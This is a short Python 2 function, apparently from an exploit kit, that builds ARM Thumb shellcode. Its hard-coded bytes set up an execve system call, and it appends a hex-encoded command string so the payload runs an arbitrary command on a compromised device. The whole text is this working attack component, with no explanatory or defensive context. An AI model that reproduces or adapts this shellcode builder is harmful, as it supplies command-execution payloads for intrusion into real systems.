def execc( command):
	shellcode =  r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90"
	shellcode += r"\x01\xa9\x92\x1a\x0b\x27\x01\xdf"
	db = []
	for x in command:
		db.append("\\x"+x.encode("hex"))
	shellcode += "".join(db)
	return shellcode